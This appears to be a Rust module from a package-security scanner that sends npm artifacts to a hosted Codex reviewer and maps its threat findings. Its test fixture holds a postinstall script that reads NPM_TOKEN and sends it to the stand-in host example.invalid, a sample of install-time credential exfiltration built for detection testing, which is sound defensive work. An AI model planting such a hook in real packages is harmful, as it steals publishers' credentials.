//! Codex-backed analysis for the exact-artifact product spine.
//!
//! This adapter deliberately has no admission authority. It invokes an
//! explicitly measured native Codex client with saved ChatGPT subscription
//! authentication, normalizes structurally cited findings locally, and treats
//! every no-finding result as inconclusive.

use crate::{
    behavior_finding_detection_eligible_v1, BehaviorCodexObserverConfigV1, BehaviorCodexObserverV1,
    BehaviorCodexPanelOutcomeV1, BoundOptionalEvidenceOutcomeV1, BoundOptionalEvidenceV1,
    ExactArtifactAdapterRequestV1, ExactArtifactAiAdapterV1, ExactArtifactBehaviorObserverV1,
    ExactArtifactEvidenceReferenceV1, ExactArtifactFindingKindV1,
    ExactArtifactObservationConfidenceV1, ExactArtifactObservationCoverageV1,
    ExactArtifactObservationSourceV1, ExactArtifactObservationV1, ExactArtifactOptionalResultV1,
    ExactArtifactScenarioPlanV1, ExactArtifactThreatClassV1, OptionalAdapterErrorV1,
    PreparedArtifact,
};
use std::path::PathBuf;
use std::time::Duration;
use whoathere_artifact::Sha256Digest;
use whoathere_artifact_review_runtime::{
    hosted_cli_provider_identity_v2, ArtifactAiExecutionStatusV2, ArtifactAiProviderKindV2,
    ArtifactAiProviderV2, ArtifactReviewCancellationTokenV2, AuthorizedHostedCliProviderV2,
    HostedCliRuntimePolicyV2,
};
use whoathere_detector::{
    artifact_review_adapter_result_schema_sha256_v2, artifact_review_prompt_template_sha256_v2,
    build_artifact_review_request_v2, normalize_artifact_review_provider_outputs_v2,
    ArtifactFindingCategory, ArtifactReviewConfigV2, ArtifactReviewContextKindV2,
    ArtifactReviewInferenceSettingsV2, ArtifactReviewModelIdentityV2, ArtifactReviewPassV2,
    ArtifactReviewPrivacyPostureV2, ArtifactReviewPromptIdentityV2, ArtifactReviewRequestV2,
    ArtifactReviewThreatClassV2, ArtifactReviewVerdictV2, ArtifactReviewWorkItemV2,
    ArtifactStaticAnalysis, BehaviorAnalysisBundleV1, BehaviorFindingConfidenceV1,
    BehaviorThreatClassV1, SourceLanguage, ARTIFACT_REVIEW_PROMPT_TEMPLATE_ID_V2,
    ARTIFACT_REVIEW_PROMPT_TEMPLATE_VERSION_V2,
};

pub const EXACT_ARTIFACT_CODEX_PROVIDER_ID_V1: &str = "codex";

/// Explicit configuration for one subscription-backed Codex review.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExactArtifactCodexAiConfigV1 {
    pub client_path: PathBuf,
    pub client_sha256: Sha256Digest,
    pub model: String,
    pub authentication_home: PathBuf,
    pub runtime_root: PathBuf,
    pub timeout: Duration,
}

/// Observe-only Codex adapter for `artifact inspect`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExactArtifactCodexAiAdapterV1 {
    config: ExactArtifactCodexAiConfigV1,
}

impl ExactArtifactCodexAiAdapterV1 {
    pub fn new(config: ExactArtifactCodexAiConfigV1) -> Result<Self, OptionalAdapterErrorV1> {
        if !config.client_path.is_absolute()
            || !config.authentication_home.is_absolute()
            || !config.runtime_root.is_absolute()
            || config.model.is_empty()
            || config.model.len() > 256
            || config.model.eq_ignore_ascii_case("latest")
            || config.model.to_ascii_lowercase().ends_with(":latest")
            || config.timeout.is_zero()
            || config.timeout > Duration::from_secs(10 * 60)
        {
            return Err(OptionalAdapterErrorV1::new(
                "exact_artifact_codex_config_invalid",
            ));
        }
        Ok(Self { config })
    }
}

impl ExactArtifactAiAdapterV1 for ExactArtifactCodexAiAdapterV1 {
    fn provider_id(&self) -> &str {
        EXACT_ARTIFACT_CODEX_PROVIDER_ID_V1
    }

    fn readiness_reason(&self) -> Option<&'static str> {
        None
    }

    fn analyze(
        &self,
        adapter_request: &ExactArtifactAdapterRequestV1,
        prepared: &PreparedArtifact,
        deterministic: &ArtifactStaticAnalysis,
        _scenarios: &ExactArtifactScenarioPlanV1,
    ) -> Result<BoundOptionalEvidenceV1, OptionalAdapterErrorV1> {
        let review_request = build_artifact_review_request_v2(
            prepared.evidence_subject(),
            prepared.normalized(),
            deterministic,
            ArtifactReviewConfigV2 {
                policy_sha256: Sha256Digest::from_bytes(
                    format!(
                        "whoathere.exact_artifact.codex_review.v1\0{}\0{}\0{}",
                        adapter_request.request_sha256,
                        self.config.client_sha256,
                        self.config.model
                    )
                    .as_bytes(),
                ),
                provider: hosted_cli_provider_identity_v2(ArtifactAiProviderKindV2::Codex),
                model: ArtifactReviewModelIdentityV2::hosted_opaque(
                    self.config.model.clone(),
                    "provider-hosted-opaque-version",
                ),
                prompt: ArtifactReviewPromptIdentityV2 {
                    template_id: ARTIFACT_REVIEW_PROMPT_TEMPLATE_ID_V2.to_string(),
                    template_version: ARTIFACT_REVIEW_PROMPT_TEMPLATE_VERSION_V2.to_string(),
                    template_sha256: artifact_review_prompt_template_sha256_v2(),
                },
                adapter_result_schema_sha256: artifact_review_adapter_result_schema_sha256_v2(),
                privacy_posture: ArtifactReviewPrivacyPostureV2::ApprovedHosted,
                inference: ArtifactReviewInferenceSettingsV2 {
                    seed: 0,
                    temperature_milli: 0,
                    top_p_milli: 1_000,
                    context_tokens: 16_384,
                    max_output_tokens: 2_048,
                },
            },
        )
        .map_err(|_| OptionalAdapterErrorV1::new("exact_artifact_codex_request_failed"))?;

        if review_request.work_items().is_empty() {
            return optional_result(
                adapter_request,
                BoundOptionalEvidenceOutcomeV1::Incomplete,
                vec!["exact_artifact_codex_no_reviewable_content".to_string()],
                Vec::new(),
            );
        }

        let authorization = AuthorizedHostedCliProviderV2::new_codex_subscription(
            &review_request,
            self.config.client_path.clone(),
            self.config.client_sha256.clone(),
        )
        .map_err(|error| OptionalAdapterErrorV1::new(error.reason_code()))?;
        let policy = HostedCliRuntimePolicyV2::new(
            self.config.runtime_root.clone(),
            self.config.authentication_home.clone(),
            self.config.timeout,
            Duration::from_millis(500),
        )
        .map_err(|error| OptionalAdapterErrorV1::new(error.reason_code()))?;
        let cancellation = ArtifactReviewCancellationTokenV2::new();
        let specialist_pass = preferred_specialist_pass(deterministic);
        let selected_work_item =
            select_mvp_work_item(&review_request, deterministic, specialist_pass).ok_or_else(
                || OptionalAdapterErrorV1::new("exact_artifact_codex_no_reviewable_content"),
            )?;
        let outcome = authorization
            .invoke(
                &review_request,
                prepared.normalized(),
                selected_work_item.work_item_id(),
                &policy,
                &cancellation,
            )
            .map_err(|error| OptionalAdapterErrorV1::new(error.reason_code()))?;
        let receipt_sha256 = outcome
            .receipt()
            .receipt_sha256()
            .map_err(|error| OptionalAdapterErrorV1::new(error.reason_code()))?;
        let provider_status = outcome.receipt().status();
        let provider_elapsed_millis = outcome.receipt().elapsed_millis();
        let provider_stdout_byte_len = outcome.receipt().raw_stdout_byte_len();
        let provider_stderr_byte_len = outcome.receipt().raw_stderr_byte_len();
        let provider_model_output_byte_len = outcome.receipt().model_output_byte_len();
        let output = outcome.into_parts().0;
        let normalization = normalize_artifact_review_provider_outputs_v2(
            prepared.evidence_subject(),
            prepared.normalized(),
            deterministic,
            &review_request,
            std::slice::from_ref(&output),
        )
        .map_err(|_| OptionalAdapterErrorV1::new("exact_artifact_codex_output_invalid"))?;

        let result = normalization.structurally_validated_result();
        let mut reasons = vec![
            "exact_artifact_codex_coverage_incomplete".to_string(),
            "exact_artifact_codex_hosted_provider_opaque".to_string(),
            "exact_artifact_codex_trigger_target_single_work_item".to_string(),
            "exact_artifact_codex_no_admission_authority".to_string(),
            format!(
                "exact_artifact_codex_provider_status:{}",
                provider_execution_status_reason(provider_status)
            ),
            format!("exact_artifact_codex_provider_elapsed_millis:{provider_elapsed_millis}"),
            format!("exact_artifact_codex_provider_stdout_byte_len:{provider_stdout_byte_len}"),
            format!("exact_artifact_codex_provider_stderr_byte_len:{provider_stderr_byte_len}"),
            format!(
                "exact_artifact_codex_provider_model_output_byte_len:{}",
                provider_model_output_byte_len.unwrap_or(0)
            ),
            format!(
                "exact_artifact_codex_receipt_sha256:{}",
                receipt_sha256.as_str().trim_start_matches("sha256:")
            ),
        ];
        for outcome in normalization.outcomes() {
            reasons.push(outcome.status().reason_code().to_string());
            reasons.push(format!(
                "exact_artifact_codex_declared_finding_count:{}",
                outcome.declared_finding_count()
            ));
            reasons.push(format!(
                "exact_artifact_codex_structurally_valid_finding_count:{}",
                outcome.structurally_valid_finding_count()
            ));
            reasons.push(format!(
                "exact_artifact_codex_retained_finding_count:{}",
                outcome.retained_finding_count()
            ));
            reasons.push(format!(
                "exact_artifact_codex_rejected_finding_count:{}",
                outcome.rejected_finding_count()
            ));
            reasons.extend(
                outcome
                    .rejection_reasons()
                    .iter()
                    .map(|reason| reason.reason_code().to_string()),
            );
        }
        for finding in result.findings() {
            reasons.push(format!(
                "exact_artifact_codex_threat_class:{}",
                threat_class_reason(finding.threat_class())
            ));
        }
        let observations = result
            .findings()
            .iter()
            .map(|finding| {
                ExactArtifactObservationV1::new(
                    ExactArtifactObservationSourceV1::AiSourceReview,
                    source_review_threat_class(finding.threat_class()),
                    ExactArtifactFindingKindV1::AiSourceReview(finding.category()),
                    ExactArtifactObservationConfidenceV1::Moderate,
                    prepared.normalized().manifest.artifact_sha256.clone(),
                    prepared.normalized().manifest.manifest_sha256.clone(),
                    ExactArtifactEvidenceReferenceV1::AiSourceReview {
                        finding_id_sha256: finding.finding_id_sha256().clone(),
                        evidence_sha256: finding.evidence_sha256().clone(),
                        file_id: finding.file_id().clone(),
                        file_sha256: finding.file_sha256().clone(),
                        start_byte: finding.start_byte(),
                        end_byte: finding.end_byte(),
                        start_line: finding.start_line(),
                        end_line: finding.end_line(),
                        selected_sha256: finding.selected_sha256().clone(),
                    },
                    ExactArtifactObservationCoverageV1::Incomplete,
                    vec!["exact_artifact_codex_coverage_incomplete".to_string()],
                    false,
                )
            })
            .collect::<Result<Vec<_>, _>>()?;

        let outcome = match result.verdict() {
            ArtifactReviewVerdictV2::Suspicious => {
                reasons.push("exact_artifact_codex_suspicious_finding".to_string());
                BoundOptionalEvidenceOutcomeV1::FindingsWithIncompleteCoverage
            }
            ArtifactReviewVerdictV2::NoFinding | ArtifactReviewVerdictV2::Uncertain => {
                reasons.push("exact_artifact_codex_no_finding_inconclusive".to_string());
                BoundOptionalEvidenceOutcomeV1::Incomplete
            }
        };
        optional_result(adapter_request, outcome, reasons, observations)
    }
}

impl ExactArtifactBehaviorObserverV1 for ExactArtifactCodexAiAdapterV1 {
    fn provider_id(&self) -> &str {
        EXACT_ARTIFACT_CODEX_PROVIDER_ID_V1
    }

    fn readiness_reason(&self) -> Option<&'static str> {
        None
    }

    fn observe_behavior(
        &self,
        adapter_request: &ExactArtifactAdapterRequestV1,
        bundle: &BehaviorAnalysisBundleV1,
    ) -> Result<BoundOptionalEvidenceV1, OptionalAdapterErrorV1> {
        let bundle_sha256 = bundle.bundle_sha256();
        if adapter_request.stage != "behavior_observation"
            || adapter_request.artifact_sha256 != bundle.artifact_sha256().as_str()
            || adapter_request.manifest_sha256 != bundle.manifest_sha256().as_str()
            || adapter_request.behavior_bundle_sha256.as_deref() != Some(bundle_sha256.as_str())
        {
            return Err(OptionalAdapterErrorV1::new(
                "exact_artifact_codex_behavior_binding_invalid",
            ));
        }

        let observer = match BehaviorCodexObserverV1::new(BehaviorCodexObserverConfigV1 {
            client_path: self.config.client_path.clone(),
            client_sha256: self.config.client_sha256.clone(),
            model: self.config.model.clone(),
            authentication_home: self.config.authentication_home.clone(),
            runtime_root: self.config.runtime_root.join("behavior-observer"),
            timeout: self.config.timeout,
        }) {
            Ok(observer) => observer,
            Err(error) => {
                return optional_result(
                    adapter_request,
                    BoundOptionalEvidenceOutcomeV1::Incomplete,
                    vec![
                        "exact_artifact_codex_behavior_coverage_incomplete".to_string(),
                        "exact_artifact_codex_behavior_no_admission_authority".to_string(),
                        error.reason_code().to_string(),
                    ],
                    Vec::new(),
                );
            }
        };
        let panel = match observer.observe_all(bundle) {
            Ok(panel) => panel,
            Err(error) => {
                return optional_result(
                    adapter_request,
                    BoundOptionalEvidenceOutcomeV1::Incomplete,
                    vec![
                        "exact_artifact_codex_behavior_coverage_incomplete".to_string(),
                        "exact_artifact_codex_behavior_no_admission_authority".to_string(),
                        error.reason_code().to_string(),
                    ],
                    Vec::new(),
                );
            }
        };

        let mut coverage_gap_codes = panel
            .correlation_report()
            .map(|report| report.coverage_gap_codes().to_vec())
            .unwrap_or_default();
        if !bundle.is_complete() {
            coverage_gap_codes
                .push("exact_artifact_behavior_bundle_coverage_incomplete".to_string());
        }
        if !panel.role_failures().is_empty() {
            coverage_gap_codes.push("exact_artifact_behavior_specialist_failure".to_string());
            coverage_gap_codes.extend(
                panel
                    .role_failures()
                    .iter()
                    .map(|failure| failure.reason_code().to_string()),
            );
        }
        coverage_gap_codes.sort();
        coverage_gap_codes.dedup();
        let coverage = if coverage_gap_codes.is_empty() {
            ExactArtifactObservationCoverageV1::Complete
        } else {
            ExactArtifactObservationCoverageV1::Incomplete
        };

        let observations = panel
            .correlation_report()
            .into_iter()
            .flat_map(|report| report.findings())
            .map(|finding| {
                let mut events = finding.evidence().to_vec();
                events.sort();
                events.dedup();
                ExactArtifactObservationV1::new(
                    ExactArtifactObservationSourceV1::AiBehavioral,
                    behavior_threat_class(finding.threat_class()),
                    ExactArtifactFindingKindV1::AiBehavioral(finding.kind()),
                    behavior_confidence(finding.confidence()),
                    bundle.artifact_sha256().clone(),
                    bundle.manifest_sha256().clone(),
                    ExactArtifactEvidenceReferenceV1::AiBehavioral {
                        bundle_sha256: bundle_sha256.clone(),
                        finding_sha256: finding.finding_sha256().clone(),
                        events,
                    },
                    coverage,
                    coverage_gap_codes.clone(),
                    behavior_finding_detection_eligible_v1(finding.kind()),
                )
            })
            .collect::<Result<Vec<_>, _>>()?;

        let positive =
            panel.outcome() == BehaviorCodexPanelOutcomeV1::Positive && !observations.is_empty();
        let outcome = if positive {
            if coverage == ExactArtifactObservationCoverageV1::Incomplete {
                BoundOptionalEvidenceOutcomeV1::FindingsWithIncompleteCoverage
            } else {
                BoundOptionalEvidenceOutcomeV1::Findings
            }
        } else {
            BoundOptionalEvidenceOutcomeV1::Incomplete
        };
        let mut reasons = vec![
            panel.reason_code().to_string(),
            "exact_artifact_codex_behavior_no_admission_authority".to_string(),
        ];
        if coverage == ExactArtifactObservationCoverageV1::Incomplete || !positive {
            reasons.push("exact_artifact_codex_behavior_coverage_incomplete".to_string());
        }
        optional_result(adapter_request, outcome, reasons, observations)
    }
}

fn preferred_specialist_pass(analysis: &ArtifactStaticAnalysis) -> ArtifactReviewPassV2 {
    if analysis
        .trigger_graph
        .surfaces
        .iter()
        .any(|surface| surface.target_file_id.is_some())
    {
        return ArtifactReviewPassV2::Trigger;
    }
    let has_category = |categories: &[ArtifactFindingCategory]| {
        analysis
            .findings
            .iter()
            .any(|finding| categories.contains(&finding.category))
    };
    if has_category(&[
        ArtifactFindingCategory::CredentialAccess,
        ArtifactFindingCategory::SensitivePathAccess,
        ArtifactFindingCategory::CredentialExfiltrationCapability,
        ArtifactFindingCategory::SensitiveFileExfiltrationCapability,
        ArtifactFindingCategory::HttpsSensitiveExfiltrationCapability,
    ]) {
        ArtifactReviewPassV2::CredentialFilesystem
    } else if has_category(&[
        ArtifactFindingCategory::NetworkCapability,
        ArtifactFindingCategory::EnvironmentExfiltrationCapability,
    ]) {
        ArtifactReviewPassV2::NetworkExfiltration
    } else if has_category(&[
        ArtifactFindingCategory::ProcessExecution,
        ArtifactFindingCategory::DownloadExecuteCapability,
        ArtifactFindingCategory::EnvironmentToProcessCapability,
    ]) {
        ArtifactReviewPassV2::ProcessExecution
    } else if has_category(&[ArtifactFindingCategory::EnvironmentAccess]) {
        ArtifactReviewPassV2::EnvironmentGating
    } else {
        ArtifactReviewPassV2::Trigger
    }
}

fn select_mvp_work_item<'a>(
    request: &'a ArtifactReviewRequestV2,
    analysis: &ArtifactStaticAnalysis,
    specialist_pass: ArtifactReviewPassV2,
) -> Option<&'a ArtifactReviewWorkItemV2> {
    for target_file_id in analysis
        .trigger_graph
        .surfaces
        .iter()
        .filter_map(|surface| surface.target_file_id.as_ref())
    {
        let Some(file) = request.coverage().files().iter().find(|file| {
            file.file_id() == target_file_id
                && executable_source_language(file.language())
                && file
                    .contexts()
                    .iter()
                    .any(|context| context.kind() == ArtifactReviewContextKindV2::TriggerSurface)
        }) else {
            continue;
        };
        let Some(first_chunk) = file.chunks().iter().min_by_key(|chunk| chunk.start_byte()) else {
            continue;
        };
        if let Some(item) = request.work_items().iter().find(|item| {
            item.pass() == specialist_pass
                && item.file_id() == target_file_id
                && item.chunk_id() == first_chunk.chunk_id()
        }) {
            return Some(item);
        }
    }

    let trigger_surface_file = |item: &&ArtifactReviewWorkItemV2, executable_only: bool| {
        item.pass() == specialist_pass
            && request.coverage().files().iter().any(|file| {
                file.file_id() == item.file_id()
                    && (!executable_only || executable_source_language(file.language()))
                    && file.contexts().iter().any(|context| {
                        context.kind() == ArtifactReviewContextKindV2::TriggerSurface
                    })
            })
    };
    request
        .work_items()
        .iter()
        .find(|item| trigger_surface_file(item, true))
        .or_else(|| {
            request
                .work_items()
                .iter()
                .find(|item| trigger_surface_file(item, false))
        })
        .or_else(|| {
            request
                .work_items()
                .iter()
                .find(|item| item.pass() == specialist_pass)
        })
        .or_else(|| request.work_items().first())
}

fn executable_source_language(language: SourceLanguage) -> bool {
    matches!(
        language,
        SourceLanguage::Javascript
            | SourceLanguage::Typescript
            | SourceLanguage::Python
            | SourceLanguage::Shell
            | SourceLanguage::Pth
    )
}

fn provider_execution_status_reason(status: ArtifactAiExecutionStatusV2) -> &'static str {
    match status {
        ArtifactAiExecutionStatusV2::Completed => "completed",
        ArtifactAiExecutionStatusV2::ClientNonZeroExit => "client_non_zero_exit",
        ArtifactAiExecutionStatusV2::TimedOut => "timed_out",
        ArtifactAiExecutionStatusV2::Cancelled => "cancelled",
        ArtifactAiExecutionStatusV2::StdoutLimitExceeded => "stdout_limit_exceeded",
        ArtifactAiExecutionStatusV2::StderrLimitExceeded => "stderr_limit_exceeded",
        ArtifactAiExecutionStatusV2::OutputCaptureIncomplete => "output_capture_incomplete",
        ArtifactAiExecutionStatusV2::ProcessCleanupFailed => "process_cleanup_failed",
        ArtifactAiExecutionStatusV2::OutputEnvelopeInvalid => "output_envelope_invalid",
        ArtifactAiExecutionStatusV2::ClientIdentityChanged => "client_identity_changed",
        ArtifactAiExecutionStatusV2::IsolationCheckFailed => "isolation_check_failed",
        ArtifactAiExecutionStatusV2::AuthenticationContinuityFailed => {
            "authentication_continuity_failed"
        }
        ArtifactAiExecutionStatusV2::ObservedModelMismatch => "observed_model_mismatch",
        ArtifactAiExecutionStatusV2::PostExecutionVerificationFailed => {
            "post_execution_verification_failed"
        }
    }
}

fn optional_result(
    adapter_request: &ExactArtifactAdapterRequestV1,
    outcome: BoundOptionalEvidenceOutcomeV1,
    reasons: Vec<String>,
    observations: Vec<ExactArtifactObservationV1>,
) -> Result<BoundOptionalEvidenceV1, OptionalAdapterErrorV1> {
    ExactArtifactOptionalResultV1::with_evidence(
        adapter_request.request_sha256.clone(),
        outcome,
        reasons,
        observations,
        Vec::new(),
    )
    .and_then(|result| result.to_canonical_json_bytes())
    .map(|canonical_result_bytes| BoundOptionalEvidenceV1 {
        canonical_result_bytes,
        behavior_bundles: Vec::new(),
    })
}

fn source_review_threat_class(
    threat_class: ArtifactReviewThreatClassV2,
) -> ExactArtifactThreatClassV1 {
    match threat_class {
        ArtifactReviewThreatClassV2::CredentialAndSensitiveFileDiscovery => {
            ExactArtifactThreatClassV1::CredentialAndSensitiveFileDiscovery
        }
        ArtifactReviewThreatClassV2::NetworkExfiltrationAndMetadataAccess => {
            ExactArtifactThreatClassV1::NetworkAndExfiltration
        }
        ArtifactReviewThreatClassV2::SecondStageNativeOrWasmHandoff => {
            ExactArtifactThreatClassV1::SecondStageNativeOrWasmHandoff
        }
        ArtifactReviewThreatClassV2::ProcessShellOrDynamicLoading => {
            ExactArtifactThreatClassV1::ProcessExecutionAndDynamicLoading
        }
        ArtifactReviewThreatClassV2::ObfuscationPackingOrStringConstruction => {
            ExactArtifactThreatClassV1::ObfuscationAndPacking
        }
        ArtifactReviewThreatClassV2::EnvironmentOrDelayedGating => {
            ExactArtifactThreatClassV1::EnvironmentAndTimeGating
        }
        ArtifactReviewThreatClassV2::PersistenceDestructionOrSelfDeletion => {
            ExactArtifactThreatClassV1::PersistenceDestructionAndSelfDeletion
        }
        ArtifactReviewThreatClassV2::RepositoryWorkflowPublicationOrPropagation => {
            ExactArtifactThreatClassV1::RepositoryPackageAndSelfPropagation
        }
        ArtifactReviewThreatClassV2::DependencyIndirectionConfusionOrTransitiveCompromise => {
            ExactArtifactThreatClassV1::DependencyIndirection
        }
        ArtifactReviewThreatClassV2::ImportOrUseTimeTampering => {
            ExactArtifactThreatClassV1::ImportTimeTampering
        }
    }
}

fn behavior_threat_class(threat_class: BehaviorThreatClassV1) -> ExactArtifactThreatClassV1 {
    match threat_class {
        BehaviorThreatClassV1::CredentialAndSensitiveFileDiscovery => {
            ExactArtifactThreatClassV1::CredentialAndSensitiveFileDiscovery
        }
        BehaviorThreatClassV1::NetworkAndExfiltration => {
            ExactArtifactThreatClassV1::NetworkAndExfiltration
        }
        BehaviorThreatClassV1::SecondStageNativeOrWasmHandoff => {
            ExactArtifactThreatClassV1::SecondStageNativeOrWasmHandoff
        }
        BehaviorThreatClassV1::ProcessExecutionAndDynamicLoading => {
            ExactArtifactThreatClassV1::ProcessExecutionAndDynamicLoading
        }
        BehaviorThreatClassV1::ObfuscationAndPacking => {
            ExactArtifactThreatClassV1::ObfuscationAndPacking
        }
        BehaviorThreatClassV1::EnvironmentAndTimeGating => {
            ExactArtifactThreatClassV1::EnvironmentAndTimeGating
        }
        BehaviorThreatClassV1::PersistenceDestructionAndSelfDeletion => {
            ExactArtifactThreatClassV1::PersistenceDestructionAndSelfDeletion
        }
        BehaviorThreatClassV1::RepositoryPackageAndSelfPropagation => {
            ExactArtifactThreatClassV1::RepositoryPackageAndSelfPropagation
        }
        BehaviorThreatClassV1::DependencyIndirection => {
            ExactArtifactThreatClassV1::DependencyIndirection
        }
        BehaviorThreatClassV1::ImportTimeTampering => {
            ExactArtifactThreatClassV1::ImportTimeTampering
        }
    }
}

fn behavior_confidence(
    confidence: BehaviorFindingConfidenceV1,
) -> ExactArtifactObservationConfidenceV1 {
    match confidence {
        BehaviorFindingConfidenceV1::Moderate => ExactArtifactObservationConfidenceV1::Moderate,
        BehaviorFindingConfidenceV1::High => ExactArtifactObservationConfidenceV1::High,
    }
}

fn threat_class_reason(threat_class: ArtifactReviewThreatClassV2) -> &'static str {
    match threat_class {
        ArtifactReviewThreatClassV2::CredentialAndSensitiveFileDiscovery => {
            "credential_and_sensitive_file_discovery"
        }
        ArtifactReviewThreatClassV2::NetworkExfiltrationAndMetadataAccess => {
            "network_exfiltration_and_metadata_access"
        }
        ArtifactReviewThreatClassV2::SecondStageNativeOrWasmHandoff => {
            "second_stage_native_or_wasm_handoff"
        }
        ArtifactReviewThreatClassV2::ProcessShellOrDynamicLoading => {
            "process_shell_or_dynamic_loading"
        }
        ArtifactReviewThreatClassV2::ObfuscationPackingOrStringConstruction => {
            "obfuscation_packing_or_string_construction"
        }
        ArtifactReviewThreatClassV2::EnvironmentOrDelayedGating => "environment_or_delayed_gating",
        ArtifactReviewThreatClassV2::PersistenceDestructionOrSelfDeletion => {
            "persistence_destruction_or_self_deletion"
        }
        ArtifactReviewThreatClassV2::RepositoryWorkflowPublicationOrPropagation => {
            "repository_workflow_publication_or_propagation"
        }
        ArtifactReviewThreatClassV2::DependencyIndirectionConfusionOrTransitiveCompromise => {
            "dependency_indirection_confusion_or_transitive_compromise"
        }
        ArtifactReviewThreatClassV2::ImportOrUseTimeTampering => "import_or_use_time_tampering",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::io::Cursor;
    use whoathere_artifact::{
        normalize_artifact, AcquisitionMethod, ArtifactEnvelope, ArtifactEnvelopeInput,
        ArtifactFormat, ArtifactSourceType, Ecosystem, NormalizationLimits,
    };
    use whoathere_detector::analyze_normalized_artifact;
    use whoathere_evidence::v2::{
        canonical_cas_object_key_for_artifact, ArtifactEvidenceSubjectV2,
    };

    fn npm_tarball(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let encoder = GzEncoder::new(Vec::new(), Compression::default());
        let mut archive = tar::Builder::new(encoder);
        for (path, bytes) in entries {
            let mut header = tar::Header::new_gnu();
            header.set_entry_type(tar::EntryType::Regular);
            header.set_size(bytes.len() as u64);
            header.set_mode(0o644);
            header.set_uid(0);
            header.set_gid(0);
            header.set_mtime(0);
            header.set_cksum();
            archive
                .append_data(&mut header, *path, Cursor::new(*bytes))
                .expect("append inert npm member");
        }
        archive
            .into_inner()
            .expect("finish tar")
            .finish()
            .expect("finish gzip")
    }

    #[test]
    fn mvp_selection_uses_full_trigger_review_on_direct_postinstall_target() {
        let bytes = npm_tarball(&[
            (
                "package/package.json",
                br#"{"name":"selection-fixture","version":"1.0.0","scripts":{"postinstall":"node install.js"}}"#,
            ),
            (
                "package/install.js",
                b"require('./decoy.js'); const token = process.env.NPM_TOKEN; fetch('https://example.invalid/' + token);\n",
            ),
            (
                "package/decoy.js",
                b"const value = process.env.HOME; console.log(value);\n",
            ),
        ]);
        let envelope = ArtifactEnvelope::from_original_bytes(
            ArtifactEnvelopeInput {
                ecosystem: Ecosystem::Npm,
                package_name: Some("selection-fixture".to_string()),
                package_version: Some("1.0.0".to_string()),
                source_coordinate: "fixture:selection-fixture@1.0.0".to_string(),
                source_type: ArtifactSourceType::LocalFile,
                acquired_at: "2026-07-15T00:00:00Z".to_string(),
                acquisition_method: AcquisitionMethod::LocalInertFixture,
                original_filename: "selection-fixture-1.0.0.tgz".to_string(),
                declared_format: Some(ArtifactFormat::NpmTarGzip),
                custody_reference: "inert-selection-fixture".to_string(),
                resolver_metadata_sha256: None,
                registry_metadata_sha256: None,
                policy_version: "exact-artifact-codex-selection-test.v1".to_string(),
                requires_external_dependency_resolution: false,
            },
            &bytes,
            ArtifactFormat::NpmTarGzip,
        );
        let artifact = normalize_artifact(&envelope, &bytes, NormalizationLimits::default())
            .expect("normalize npm fixture");
        let analysis = analyze_normalized_artifact(&artifact).expect("analyze npm fixture");
        let artifact_sha256 = artifact.manifest.artifact_sha256.as_str();
        let subject = ArtifactEvidenceSubjectV2::new(
            artifact_sha256,
            Sha256Digest::from_bytes(b"selection fixture envelope").to_string(),
            artifact.manifest.manifest_sha256.to_string(),
            canonical_cas_object_key_for_artifact(artifact_sha256).expect("canonical CAS key"),
        )
        .expect("evidence subject");
        let request = build_artifact_review_request_v2(
            &subject,
            &artifact,
            &analysis,
            ArtifactReviewConfigV2 {
                policy_sha256: Sha256Digest::from_bytes(b"selection fixture policy"),
                provider: hosted_cli_provider_identity_v2(ArtifactAiProviderKindV2::Codex),
                model: ArtifactReviewModelIdentityV2::hosted_opaque(
                    "gpt-selection-fixture",
                    "provider-hosted-opaque-version",
                ),
                prompt: ArtifactReviewPromptIdentityV2 {
                    template_id: ARTIFACT_REVIEW_PROMPT_TEMPLATE_ID_V2.to_string(),
                    template_version: ARTIFACT_REVIEW_PROMPT_TEMPLATE_VERSION_V2.to_string(),
                    template_sha256: artifact_review_prompt_template_sha256_v2(),
                },
                adapter_result_schema_sha256: artifact_review_adapter_result_schema_sha256_v2(),
                privacy_posture: ArtifactReviewPrivacyPostureV2::ApprovedHosted,
                inference: ArtifactReviewInferenceSettingsV2 {
                    seed: 0,
                    temperature_milli: 0,
                    top_p_milli: 1_000,
                    context_tokens: 16_384,
                    max_output_tokens: 2_048,
                },
            },
        )
        .expect("build review request");

        assert!(request.work_items().iter().any(|item| {
            item.pass() == ArtifactReviewPassV2::CredentialFilesystem
                && request.coverage().files().iter().any(|file| {
                    file.file_id() == item.file_id()
                        && file.language() == SourceLanguage::JsonMetadata
                        && file.contexts().iter().any(|context| {
                            context.kind() == ArtifactReviewContextKindV2::TriggerSurface
                        })
                })
        }));
        assert!(analysis.findings.iter().any(|finding| {
            finding.category == ArtifactFindingCategory::CredentialExfiltrationCapability
        }));
        let specialist_pass = preferred_specialist_pass(&analysis);
        assert_eq!(specialist_pass, ArtifactReviewPassV2::Trigger);
        let selected =
            select_mvp_work_item(&request, &analysis, specialist_pass).expect("selected work item");
        let selected_file = request
            .coverage()
            .files()
            .iter()
            .find(|file| file.file_id() == selected.file_id())
            .expect("selected file coverage");
        let selected_path = artifact
            .file(selected.file_id())
            .map(|file| file.normalized_path.as_str())
            .expect("selected file coverage");
        let selected_chunk = selected_file
            .chunks()
            .iter()
            .find(|chunk| chunk.chunk_id() == selected.chunk_id())
            .expect("selected physical chunk");
        assert_eq!(selected.pass(), ArtifactReviewPassV2::Trigger);
        assert_eq!(selected_file.language(), SourceLanguage::Javascript);
        assert_eq!(selected_path, "install.js");
        assert_eq!(selected_chunk.start_byte(), 0);
    }
}
